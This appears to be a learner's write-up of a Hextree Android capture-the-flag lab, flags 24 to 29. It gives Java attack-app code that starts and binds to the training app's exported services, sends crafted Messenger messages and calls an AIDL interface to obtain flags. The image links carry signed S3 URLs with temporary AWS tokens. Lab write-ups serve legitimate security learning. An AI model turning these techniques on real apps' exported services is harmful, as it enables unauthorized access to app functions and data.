![](https://prod-files-secure.s3.us-west-2.amazonaws.com/51dfded5-2eb3-8139-90b1-0003750a523f/6d194fe1-1e30-4316-bf92-e8cca2e403b0/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466ZJXEGKAQ%2F20260423%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260423T045518Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFJEgUby7iG2m8MXpggHbWtZgmisNSvwBruBkO2ibEYLAiEAsp5vG5R3X%2B6fEgvZxc4sJNkOV%2Fld7TxTBjlf%2BXtmy6Yq%2FwMIXBAAGgw2Mzc0MjMxODM4MDUiDOBLvf%2FfBqMYJz%2BpuCrcAxsVuDBKiGWw4o2kCgzYAIjkhbFXgqlljJwhA5Ccu6DYM9CxgsYhhLqL359kRIcOvdizbi3qSFwXxSLxMoMBWGlbJJ0Tijfnm8stl46beWwhcehBPZoZvYW%2BNM%2BSNGfur4dlQtvIejRyX66QyEuSJ8N1U2z3EZ0EQZvqWPTBmXwq1Tga%2BD5UDlhcbkzVKwc5pQjCsdHVFYfYb2CkKO%2FUJ5QOY8OpPI%2Fjm33FhR96Q5cQY1kUN3zT9dFf46SdUGvRzkSCg85lULG%2F8ikIFwkGKKbtUrHsB7kKMMHijZ75JTDFS3n5dk49Wf3Xmg8X3ZW560%2FDx3TWvJBmm7zaXVCtJPGoVsVcsE7L9cNwkLw2K8qI4ZtKHE%2BpmBfwtrAls7YbMAJXU0%2F4BLXUHNaHq21w8THKnyB0lQ4Ch9BDh25sP2BMIPvoT1xJxWthOTovHuw2WbN7JBsNjA5TwVO4xeoBeyeCMauXcY3tCX%2BVYcTePCxs%2BmeUpciCrmJZcJ2f9o895R19PqvQH9iCyCXnARTpteXHHQcb1yAJ09sLdIbEbhaWqN3%2Bbt10qz0FTL4wDCrkGzUOqyprUd55o21QpSD%2FJ683xT6p70L0FS%2Fk0xGpX6gPC8F5Vo3ueNt220gQMNKXps8GOqUB98mACGjVYBEjmPCH9wbRacoRKntjbpol1QmfKAsSfrv71PKOA74U8ZnZoYVqV28QyQzwAR%2B0Y%2BC4ung%2BqrMJTSP%2FSCE9OzPYKh5zmWdR2dB8xvILljiC7laDz%2F5By04dkaQylLa5gXFglJyDfBJTAT5faGeO9PYHNZz4vBdjHyKDprWnqsWFGCiImcLaVC7v2DhUK%2BsrOQFPUYyWGZVaeMlVDlvO&X-Amz-Signature=42704e88c8b6ea102a06977cb481af6fdd59a32398e53b5c44628571a46a85b1&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
The above code is from flag24 provider 
![](https://prod-files-secure.s3.us-west-2.amazonaws.com/51dfded5-2eb3-8139-90b1-0003750a523f/da719073-9ce5-431f-84c4-1d6c174db440/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466ZJXEGKAQ%2F20260423%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260423T045518Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFJEgUby7iG2m8MXpggHbWtZgmisNSvwBruBkO2ibEYLAiEAsp5vG5R3X%2B6fEgvZxc4sJNkOV%2Fld7TxTBjlf%2BXtmy6Yq%2FwMIXBAAGgw2Mzc0MjMxODM4MDUiDOBLvf%2FfBqMYJz%2BpuCrcAxsVuDBKiGWw4o2kCgzYAIjkhbFXgqlljJwhA5Ccu6DYM9CxgsYhhLqL359kRIcOvdizbi3qSFwXxSLxMoMBWGlbJJ0Tijfnm8stl46beWwhcehBPZoZvYW%2BNM%2BSNGfur4dlQtvIejRyX66QyEuSJ8N1U2z3EZ0EQZvqWPTBmXwq1Tga%2BD5UDlhcbkzVKwc5pQjCsdHVFYfYb2CkKO%2FUJ5QOY8OpPI%2Fjm33FhR96Q5cQY1kUN3zT9dFf46SdUGvRzkSCg85lULG%2F8ikIFwkGKKbtUrHsB7kKMMHijZ75JTDFS3n5dk49Wf3Xmg8X3ZW560%2FDx3TWvJBmm7zaXVCtJPGoVsVcsE7L9cNwkLw2K8qI4ZtKHE%2BpmBfwtrAls7YbMAJXU0%2F4BLXUHNaHq21w8THKnyB0lQ4Ch9BDh25sP2BMIPvoT1xJxWthOTovHuw2WbN7JBsNjA5TwVO4xeoBeyeCMauXcY3tCX%2BVYcTePCxs%2BmeUpciCrmJZcJ2f9o895R19PqvQH9iCyCXnARTpteXHHQcb1yAJ09sLdIbEbhaWqN3%2Bbt10qz0FTL4wDCrkGzUOqyprUd55o21QpSD%2FJ683xT6p70L0FS%2Fk0xGpX6gPC8F5Vo3ueNt220gQMNKXps8GOqUB98mACGjVYBEjmPCH9wbRacoRKntjbpol1QmfKAsSfrv71PKOA74U8ZnZoYVqV28QyQzwAR%2B0Y%2BC4ung%2BqrMJTSP%2FSCE9OzPYKh5zmWdR2dB8xvILljiC7laDz%2F5By04dkaQylLa5gXFglJyDfBJTAT5faGeO9PYHNZz4vBdjHyKDprWnqsWFGCiImcLaVC7v2DhUK%2BsrOQFPUYyWGZVaeMlVDlvO&X-Amz-Signature=f5f3393e84b183266a738960bf9a6393f03c0d9eeb65422620f57b14537cb63b&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
The above code is from flag24activity
From the jadx code we can understand that the target app responds to an action io.hextree.services.START_FLAG24_SERVICE and if the action is same it implements the success method and in the method we can see its sending intent to flag 24 activity  
And the flag 24 activity receives it and checks weather it got the correct extras which is secret and if its true it calls the success method
The attack code used was 
```java
@Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Intent intent = new Intent();
        intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag24Service");
        intent.setAction("io.hextree.services.START_FLAG24_SERVICE");
        startService(intent);
    }
```
### Flag25
Services are also similar to methods of intents and broadcasts 
![](https://prod-files-secure.s3.us-west-2.amazonaws.com/51dfded5-2eb3-8139-90b1-0003750a523f/153320a7-8104-4451-80b7-cebce75bee70/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466ZJXEGKAQ%2F20260423%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260423T045518Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFJEgUby7iG2m8MXpggHbWtZgmisNSvwBruBkO2ibEYLAiEAsp5vG5R3X%2B6fEgvZxc4sJNkOV%2Fld7TxTBjlf%2BXtmy6Yq%2FwMIXBAAGgw2Mzc0MjMxODM4MDUiDOBLvf%2FfBqMYJz%2BpuCrcAxsVuDBKiGWw4o2kCgzYAIjkhbFXgqlljJwhA5Ccu6DYM9CxgsYhhLqL359kRIcOvdizbi3qSFwXxSLxMoMBWGlbJJ0Tijfnm8stl46beWwhcehBPZoZvYW%2BNM%2BSNGfur4dlQtvIejRyX66QyEuSJ8N1U2z3EZ0EQZvqWPTBmXwq1Tga%2BD5UDlhcbkzVKwc5pQjCsdHVFYfYb2CkKO%2FUJ5QOY8OpPI%2Fjm33FhR96Q5cQY1kUN3zT9dFf46SdUGvRzkSCg85lULG%2F8ikIFwkGKKbtUrHsB7kKMMHijZ75JTDFS3n5dk49Wf3Xmg8X3ZW560%2FDx3TWvJBmm7zaXVCtJPGoVsVcsE7L9cNwkLw2K8qI4ZtKHE%2BpmBfwtrAls7YbMAJXU0%2F4BLXUHNaHq21w8THKnyB0lQ4Ch9BDh25sP2BMIPvoT1xJxWthOTovHuw2WbN7JBsNjA5TwVO4xeoBeyeCMauXcY3tCX%2BVYcTePCxs%2BmeUpciCrmJZcJ2f9o895R19PqvQH9iCyCXnARTpteXHHQcb1yAJ09sLdIbEbhaWqN3%2Bbt10qz0FTL4wDCrkGzUOqyprUd55o21QpSD%2FJ683xT6p70L0FS%2Fk0xGpX6gPC8F5Vo3ueNt220gQMNKXps8GOqUB98mACGjVYBEjmPCH9wbRacoRKntjbpol1QmfKAsSfrv71PKOA74U8ZnZoYVqV28QyQzwAR%2B0Y%2BC4ung%2BqrMJTSP%2FSCE9OzPYKh5zmWdR2dB8xvILljiC7laDz%2F5By04dkaQylLa5gXFglJyDfBJTAT5faGeO9PYHNZz4vBdjHyKDprWnqsWFGCiImcLaVC7v2DhUK%2BsrOQFPUYyWGZVaeMlVDlvO&X-Amz-Signature=71fd747032ff1b0885a16a1eae91fc52048e954fcec2a2093aca9637e047f90e&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
The above code represents the flag25 service class in which we can observe its a three lock system if lock 1 unlocks checking if the action that came through intent is equal to desired action then unlock similarly all other 3 locks at last call the success function
In the success function we send the proofs that lock2 and lock3 are unlocked and we send a string secret
![](https://prod-files-secure.s3.us-west-2.amazonaws.com/51dfded5-2eb3-8139-90b1-0003750a523f/b475848c-3014-4557-a520-1a0045963cc2/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466ZJXEGKAQ%2F20260423%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260423T045518Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFJEgUby7iG2m8MXpggHbWtZgmisNSvwBruBkO2ibEYLAiEAsp5vG5R3X%2B6fEgvZxc4sJNkOV%2Fld7TxTBjlf%2BXtmy6Yq%2FwMIXBAAGgw2Mzc0MjMxODM4MDUiDOBLvf%2FfBqMYJz%2BpuCrcAxsVuDBKiGWw4o2kCgzYAIjkhbFXgqlljJwhA5Ccu6DYM9CxgsYhhLqL359kRIcOvdizbi3qSFwXxSLxMoMBWGlbJJ0Tijfnm8stl46beWwhcehBPZoZvYW%2BNM%2BSNGfur4dlQtvIejRyX66QyEuSJ8N1U2z3EZ0EQZvqWPTBmXwq1Tga%2BD5UDlhcbkzVKwc5pQjCsdHVFYfYb2CkKO%2FUJ5QOY8OpPI%2Fjm33FhR96Q5cQY1kUN3zT9dFf46SdUGvRzkSCg85lULG%2F8ikIFwkGKKbtUrHsB7kKMMHijZ75JTDFS3n5dk49Wf3Xmg8X3ZW560%2FDx3TWvJBmm7zaXVCtJPGoVsVcsE7L9cNwkLw2K8qI4ZtKHE%2BpmBfwtrAls7YbMAJXU0%2F4BLXUHNaHq21w8THKnyB0lQ4Ch9BDh25sP2BMIPvoT1xJxWthOTovHuw2WbN7JBsNjA5TwVO4xeoBeyeCMauXcY3tCX%2BVYcTePCxs%2BmeUpciCrmJZcJ2f9o895R19PqvQH9iCyCXnARTpteXHHQcb1yAJ09sLdIbEbhaWqN3%2Bbt10qz0FTL4wDCrkGzUOqyprUd55o21QpSD%2FJ683xT6p70L0FS%2Fk0xGpX6gPC8F5Vo3ueNt220gQMNKXps8GOqUB98mACGjVYBEjmPCH9wbRacoRKntjbpol1QmfKAsSfrv71PKOA74U8ZnZoYVqV28QyQzwAR%2B0Y%2BC4ung%2BqrMJTSP%2FSCE9OzPYKh5zmWdR2dB8xvILljiC7laDz%2F5By04dkaQylLa5gXFglJyDfBJTAT5faGeO9PYHNZz4vBdjHyKDprWnqsWFGCiImcLaVC7v2DhUK%2BsrOQFPUYyWGZVaeMlVDlvO&X-Amz-Signature=596070623a17c8362c190b311cfb9ceee89685c0759dc2b686b1ad44794a6a57&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
This above code represents the flga25 activity and it checks for the locks and secret string we have passed through intent and calls the success function
```java
 @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Intent intent = new Intent();
        intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag25Service");
        intent.setAction("io.hextree.services.UNLOCK1");
        startService(intent);
        intent.setAction("io.hextree.services.UNLOCK2");
        startService(intent);
        intent.setAction("io.hextree.services.UNLOCK3");
        startService(intent);
    }
```
### Flag 26
![](https://prod-files-secure.s3.us-west-2.amazonaws.com/51dfded5-2eb3-8139-90b1-0003750a523f/14c08df2-e734-4f04-bf8d-46ef2381830d/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466ZJXEGKAQ%2F20260423%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260423T045518Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFJEgUby7iG2m8MXpggHbWtZgmisNSvwBruBkO2ibEYLAiEAsp5vG5R3X%2B6fEgvZxc4sJNkOV%2Fld7TxTBjlf%2BXtmy6Yq%2FwMIXBAAGgw2Mzc0MjMxODM4MDUiDOBLvf%2FfBqMYJz%2BpuCrcAxsVuDBKiGWw4o2kCgzYAIjkhbFXgqlljJwhA5Ccu6DYM9CxgsYhhLqL359kRIcOvdizbi3qSFwXxSLxMoMBWGlbJJ0Tijfnm8stl46beWwhcehBPZoZvYW%2BNM%2BSNGfur4dlQtvIejRyX66QyEuSJ8N1U2z3EZ0EQZvqWPTBmXwq1Tga%2BD5UDlhcbkzVKwc5pQjCsdHVFYfYb2CkKO%2FUJ5QOY8OpPI%2Fjm33FhR96Q5cQY1kUN3zT9dFf46SdUGvRzkSCg85lULG%2F8ikIFwkGKKbtUrHsB7kKMMHijZ75JTDFS3n5dk49Wf3Xmg8X3ZW560%2FDx3TWvJBmm7zaXVCtJPGoVsVcsE7L9cNwkLw2K8qI4ZtKHE%2BpmBfwtrAls7YbMAJXU0%2F4BLXUHNaHq21w8THKnyB0lQ4Ch9BDh25sP2BMIPvoT1xJxWthOTovHuw2WbN7JBsNjA5TwVO4xeoBeyeCMauXcY3tCX%2BVYcTePCxs%2BmeUpciCrmJZcJ2f9o895R19PqvQH9iCyCXnARTpteXHHQcb1yAJ09sLdIbEbhaWqN3%2Bbt10qz0FTL4wDCrkGzUOqyprUd55o21QpSD%2FJ683xT6p70L0FS%2Fk0xGpX6gPC8F5Vo3ueNt220gQMNKXps8GOqUB98mACGjVYBEjmPCH9wbRacoRKntjbpol1QmfKAsSfrv71PKOA74U8ZnZoYVqV28QyQzwAR%2B0Y%2BC4ung%2BqrMJTSP%2FSCE9OzPYKh5zmWdR2dB8xvILljiC7laDz%2F5By04dkaQylLa5gXFglJyDfBJTAT5faGeO9PYHNZz4vBdjHyKDprWnqsWFGCiImcLaVC7v2DhUK%2BsrOQFPUYyWGZVaeMlVDlvO&X-Amz-Signature=7be3150a173f157273773c94597d4bfb8a62b81d49eb4cd4213d3f8150a7969f&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
The below code represents the flag 26 service
The first we have to check for a service is weather its bounded or not bounded by checking onbind method if it returns something its bindable and able to bind to other apps if it returns null its not boundable 
The onbinder returns a ibinder object in this case ibinder acts as a messenger where we can actually pass data between two apps 
The incominghandler is a subclass of Handler that implements the handleMessage() method.
The looper acts a delivery boy checking for the messages and giving them back to the app to other apps
In this challenge the app is waiting for a message that contains 42 to call the success method which also contains few extras that are provided by service activity directly to flag26 activity to call the success method that prints the flag
```java
private Messenger serviceMessenger;
private ServiceConnection connection = new ServiceConnection() {

        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            //create messenger 
            serviceMessenger = new Messenger(service);
            //create message
            Message message = Message.obtain(null, 42);
            //send message
            serviceMessenger.send(message);

        @Override
        public void onServiceDisconnected(ComponentName name) {
            serviceMessenger = null;
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Intent intent = new Intent();
        intent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.services.Flag26Service");
        bindService(intent, connection, Context.BIND_AUTO_CREATE);
    }
```
so we have to make our attack app to send a message 
we create a service connection and messenger and send the code 42 which is expecting fro us by the code and send the message the target receives as message.what we set the target where our message is intened to go and we use bindservice and send out target class, the message, 
What is BIND_AUTO_CREATE?
BIND_AUTO_CREATE is an integer flag (usually 1) passed during the bindService() call.
Purpose: It ensures the Service is instantiated (created) if it isn't already running.
Lifecycle: When you use this flag, the Service goes through its onCreate() phase before returning the IBinder to you.
Management: As long as your app stays "Bound" to it, Android will try to keep that Service alive. Once you call unbindService() (or your app closes), if nothing else is using the Service, the System will automatically shut it down to save battery.
What is message.obtain()?
In normal cases we use new key word to create objects but in the case of message we reuse them using .obtain method
<empty-block/>
### Flag27
The below code represents flag27 service
![](https://prod-files-secure.s3.us-west-2.amazonaws.com/51dfded5-2eb3-8139-90b1-0003750a523f/9a9dce9e-e548-404f-b844-9f1be4223929/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466ZJXEGKAQ%2F20260423%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260423T045518Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFJEgUby7iG2m8MXpggHbWtZgmisNSvwBruBkO2ibEYLAiEAsp5vG5R3X%2B6fEgvZxc4sJNkOV%2Fld7TxTBjlf%2BXtmy6Yq%2FwMIXBAAGgw2Mzc0MjMxODM4MDUiDOBLvf%2FfBqMYJz%2BpuCrcAxsVuDBKiGWw4o2kCgzYAIjkhbFXgqlljJwhA5Ccu6DYM9CxgsYhhLqL359kRIcOvdizbi3qSFwXxSLxMoMBWGlbJJ0Tijfnm8stl46beWwhcehBPZoZvYW%2BNM%2BSNGfur4dlQtvIejRyX66QyEuSJ8N1U2z3EZ0EQZvqWPTBmXwq1Tga%2BD5UDlhcbkzVKwc5pQjCsdHVFYfYb2CkKO%2FUJ5QOY8OpPI%2Fjm33FhR96Q5cQY1kUN3zT9dFf46SdUGvRzkSCg85lULG%2F8ikIFwkGKKbtUrHsB7kKMMHijZ75JTDFS3n5dk49Wf3Xmg8X3ZW560%2FDx3TWvJBmm7zaXVCtJPGoVsVcsE7L9cNwkLw2K8qI4ZtKHE%2BpmBfwtrAls7YbMAJXU0%2F4BLXUHNaHq21w8THKnyB0lQ4Ch9BDh25sP2BMIPvoT1xJxWthOTovHuw2WbN7JBsNjA5TwVO4xeoBeyeCMauXcY3tCX%2BVYcTePCxs%2BmeUpciCrmJZcJ2f9o895R19PqvQH9iCyCXnARTpteXHHQcb1yAJ09sLdIbEbhaWqN3%2Bbt10qz0FTL4wDCrkGzUOqyprUd55o21QpSD%2FJ683xT6p70L0FS%2Fk0xGpX6gPC8F5Vo3ueNt220gQMNKXps8GOqUB98mACGjVYBEjmPCH9wbRacoRKntjbpol1QmfKAsSfrv71PKOA74U8ZnZoYVqV28QyQzwAR%2B0Y%2BC4ung%2BqrMJTSP%2FSCE9OzPYKh5zmWdR2dB8xvILljiC7laDz%2F5By04dkaQylLa5gXFglJyDfBJTAT5faGeO9PYHNZz4vBdjHyKDprWnqsWFGCiImcLaVC7v2DhUK%2BsrOQFPUYyWGZVaeMlVDlvO&X-Amz-Signature=47674a4ffa0c0cb2454b93f5d71389834e36806d30627469800a06dc31fc2cfe&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
As we can see there are 3 integer values 1,2,3 & 2 strings echo and password initially set to null 
The code is waiting for a message that contains the values that are needed to call the success method 
We can not only pass integers with messages but we can pass bundles and other data sets too as we can see the logic to reach the success we will implement the same method in our attack app 
This code applies a 3 way logic 
Step 1: We knock the door using bind service and make our connection using service connection 
Step2: We send the values : integer 1 and this creates a echo variable and stores the information we give through our sent bundle 
so we create a bundle containing give-flag string with the label echo
Step3: We send the integer 2 and app checks it and generates a random uuid and saves it to password in the apps memory and also sends it back 
so we have to create a receiver that can read the password it gives us 
Step4: the final check we send integer 3 and then we send back the password we got from the back because it checks for the password which we send and that is stored in apps storage and the echo variable too and finally call the success function
```java
 private Messenger serviceMessenger;
    //receives the password that is sent from the flag26service
    private final Messenger clientMessenger = new Messenger(new Handler(Looper.getMainLooper()) {
        @Override
        public void handleMessage(@NonNull Message msg) {
            if (msg.what == 2) {
                String password = msg.getData().getString("password");
                try {
                    //sends the password to flag26 service again & the integer 3
                    Message msg3 = Message.obtain(null, 3);
                    Bundle data3 = new Bundle();
                    data3.putString("password", password);
                    msg3.setData(data3);
                    serviceMessenger.send(msg3);
                } catch (RemoteException e) {
                    e.printStackTrace();
                }
            }
        }
    });

    private final ServiceConnection connection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            serviceMessenger = new Messenger(service);

            try {
                //The first pass
                Message msg1 = Message.obtain(null, 1);
                Bundle data1 = new Bundle();
                data1.putString("echo", "give flag");
                msg1.setData(data1);
                serviceMessenger.send(msg1);
                //sets adress where to send the password
                Message msg2 = Message.obtain(null, 2);
                msg2.replyTo = clientMessenger; // We give them our "Return Address"
                serviceMessenger.send(msg2);

            } catch (RemoteException e) {
                e.printStackTrace();
            }
        }

        @Override
        public void onServiceDisconnected(ComponentName name) {
            serviceMessenger = null;
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Intent intent = new Intent();
        intent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.services.Flag27Service");
        bindService(intent, connection, Context.BIND_AUTO_CREATE);
    }
```
<empty-block/>
### Flag 28 
AIDL - Android Interface Definition Language
AIDL is used when the server and the client are in different apps for IPC(inter process communication) 
If an app is using aidl the attack surface increases because we should let other apps to implement the functions and we have to set the exported to true 
This challenge uses aidl language which we can confirm by the service class using stub method even though it uses stub method and you still have a doubt jump to interface class in which the stub method is being implemented if the variables are declared with TRANSACTION_ then its aidl file for sure
In this challenge there is nothing to do with the service or activity classes all you need is the stub class 
![](https://prod-files-secure.s3.us-west-2.amazonaws.com/51dfded5-2eb3-8139-90b1-0003750a523f/baef8ac5-4a45-4b9a-9f08-d9f779c92dca/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466ZJXEGKAQ%2F20260423%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260423T045518Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFJEgUby7iG2m8MXpggHbWtZgmisNSvwBruBkO2ibEYLAiEAsp5vG5R3X%2B6fEgvZxc4sJNkOV%2Fld7TxTBjlf%2BXtmy6Yq%2FwMIXBAAGgw2Mzc0MjMxODM4MDUiDOBLvf%2FfBqMYJz%2BpuCrcAxsVuDBKiGWw4o2kCgzYAIjkhbFXgqlljJwhA5Ccu6DYM9CxgsYhhLqL359kRIcOvdizbi3qSFwXxSLxMoMBWGlbJJ0Tijfnm8stl46beWwhcehBPZoZvYW%2BNM%2BSNGfur4dlQtvIejRyX66QyEuSJ8N1U2z3EZ0EQZvqWPTBmXwq1Tga%2BD5UDlhcbkzVKwc5pQjCsdHVFYfYb2CkKO%2FUJ5QOY8OpPI%2Fjm33FhR96Q5cQY1kUN3zT9dFf46SdUGvRzkSCg85lULG%2F8ikIFwkGKKbtUrHsB7kKMMHijZ75JTDFS3n5dk49Wf3Xmg8X3ZW560%2FDx3TWvJBmm7zaXVCtJPGoVsVcsE7L9cNwkLw2K8qI4ZtKHE%2BpmBfwtrAls7YbMAJXU0%2F4BLXUHNaHq21w8THKnyB0lQ4Ch9BDh25sP2BMIPvoT1xJxWthOTovHuw2WbN7JBsNjA5TwVO4xeoBeyeCMauXcY3tCX%2BVYcTePCxs%2BmeUpciCrmJZcJ2f9o895R19PqvQH9iCyCXnARTpteXHHQcb1yAJ09sLdIbEbhaWqN3%2Bbt10qz0FTL4wDCrkGzUOqyprUd55o21QpSD%2FJ683xT6p70L0FS%2Fk0xGpX6gPC8F5Vo3ueNt220gQMNKXps8GOqUB98mACGjVYBEjmPCH9wbRacoRKntjbpol1QmfKAsSfrv71PKOA74U8ZnZoYVqV28QyQzwAR%2B0Y%2BC4ung%2BqrMJTSP%2FSCE9OzPYKh5zmWdR2dB8xvILljiC7laDz%2F5By04dkaQylLa5gXFglJyDfBJTAT5faGeO9PYHNZz4vBdjHyKDprWnqsWFGCiImcLaVC7v2DhUK%2BsrOQFPUYyWGZVaeMlVDlvO&X-Amz-Signature=154983a25074280dce3d6c1ea0a878b6028b29f24a80f6a691b87613611c1486&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
The challenge provider says which ever function throws RemoteException is the function that is being implemented 
aidl is a language it looks like java it is placed in .aidl file, aidl file is translated to java code while complilation we can see it java generated files after build
we need to be very specific about the class name and the package name and the order of the functions that are being called else the app will simply wont work 
The solution for this case is dynamic class loading
<empty-block/>
I didnt use dynamic class loading so my attack code is 
```java
private IFlag28Interface remoteService;
private ServiceConnection connection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            remoteService = IFlag28Interface.Stub.asInterface(service);
            try {
                remoteService.openflag();
            } catch (Exception e) { }
        }
        @Override
        public void onServiceDisconnected(ComponentName name) {
            remoteService = null;
        }
    };
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Intent intent = new Intent();
        intent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.services.Flag28Service");
        bindService(intent, connection, Context.BIND_AUTO_CREATE);
    }
}
```
The challenge says change options in build.gradle to set `buildFeatures {aidl = true}` else it will throw an error 
![](https://prod-files-secure.s3.us-west-2.amazonaws.com/51dfded5-2eb3-8139-90b1-0003750a523f/2f8738ed-3601-49a0-bb4d-91c2946d56f9/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466ZJXEGKAQ%2F20260423%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260423T045518Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFJEgUby7iG2m8MXpggHbWtZgmisNSvwBruBkO2ibEYLAiEAsp5vG5R3X%2B6fEgvZxc4sJNkOV%2Fld7TxTBjlf%2BXtmy6Yq%2FwMIXBAAGgw2Mzc0MjMxODM4MDUiDOBLvf%2FfBqMYJz%2BpuCrcAxsVuDBKiGWw4o2kCgzYAIjkhbFXgqlljJwhA5Ccu6DYM9CxgsYhhLqL359kRIcOvdizbi3qSFwXxSLxMoMBWGlbJJ0Tijfnm8stl46beWwhcehBPZoZvYW%2BNM%2BSNGfur4dlQtvIejRyX66QyEuSJ8N1U2z3EZ0EQZvqWPTBmXwq1Tga%2BD5UDlhcbkzVKwc5pQjCsdHVFYfYb2CkKO%2FUJ5QOY8OpPI%2Fjm33FhR96Q5cQY1kUN3zT9dFf46SdUGvRzkSCg85lULG%2F8ikIFwkGKKbtUrHsB7kKMMHijZ75JTDFS3n5dk49Wf3Xmg8X3ZW560%2FDx3TWvJBmm7zaXVCtJPGoVsVcsE7L9cNwkLw2K8qI4ZtKHE%2BpmBfwtrAls7YbMAJXU0%2F4BLXUHNaHq21w8THKnyB0lQ4Ch9BDh25sP2BMIPvoT1xJxWthOTovHuw2WbN7JBsNjA5TwVO4xeoBeyeCMauXcY3tCX%2BVYcTePCxs%2BmeUpciCrmJZcJ2f9o895R19PqvQH9iCyCXnARTpteXHHQcb1yAJ09sLdIbEbhaWqN3%2Bbt10qz0FTL4wDCrkGzUOqyprUd55o21QpSD%2FJ683xT6p70L0FS%2Fk0xGpX6gPC8F5Vo3ueNt220gQMNKXps8GOqUB98mACGjVYBEjmPCH9wbRacoRKntjbpol1QmfKAsSfrv71PKOA74U8ZnZoYVqV28QyQzwAR%2B0Y%2BC4ung%2BqrMJTSP%2FSCE9OzPYKh5zmWdR2dB8xvILljiC7laDz%2F5By04dkaQylLa5gXFglJyDfBJTAT5faGeO9PYHNZz4vBdjHyKDprWnqsWFGCiImcLaVC7v2DhUK%2BsrOQFPUYyWGZVaeMlVDlvO&X-Amz-Signature=caf26153b6a1fc1cb5792d4ff22528691cee32b2f8c65b56ab744a73ccb7c2b6&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
After creating our aidl file create another project which has the exact name mentioned in the DESCRIPTOR and the move our file into the package we created and change the package name in the code
Then finally make a connection import the interface class and call the function openflag() 
```java
// IFlag28Interface.aidl
package io.hextree.attacksurface.services;
interface IFlag28Interface {
    boolean openflag();
    }
```
<empty-block/>
<empty-block/>
### Flag 29
This challenge is similar to previous one except there are more than one functions and we can know their order by the TRANSACTION_ id’s and place them in the same order in our aidl file too
